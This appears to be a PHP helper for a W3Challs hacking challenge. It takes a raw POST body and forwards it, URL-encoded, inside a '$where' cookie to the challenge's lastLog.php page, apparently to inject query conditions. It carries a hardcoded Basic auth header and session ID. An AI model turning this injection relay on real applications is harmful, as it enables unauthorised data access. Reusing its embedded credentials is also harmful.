<pre>
<?php
function curl($url,$cookie='',$post=''){

	$ch = curl_init();
	curl_setopt($ch,CURLOPT_URL,$url);
	curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
	curl_setopt($ch,CURLOPT_COOKIE,$cookie);
	curl_setopt($ch,CURLOPT_HEADER,1);
	curl_setopt($ch,CURLOPT_FOLLOWLOCATION,0);
	curl_setopt($ch,CURLOPT_TIMEOUT,5);
	curl_setopt($ch,CURLOPT_HTTPHEADER,array('Authorization: Basic TWFbNl1uaWZpazpYMXxvRjBcZQ=='));
	if($post != ''){
		curl_setopt($ch,CURLOPT_POST,1);
		curl_setopt($ch,CURLOPT_POSTFIELDS,$post);
	}
	$result = curl_exec($ch);
	curl_close($ch);
	return $result;
}

$url = 'http://vip2.hacking.w3challs.com/lastLog.php?time=1';
$cookie = '$where='.urlencode(file_get_contents('php://input')).';PHPSESSID=muhaj9s7js4annveh5c5mndeuts552l5;';
echo $cookie;
echo curl($url,$cookie);

?>
</pre>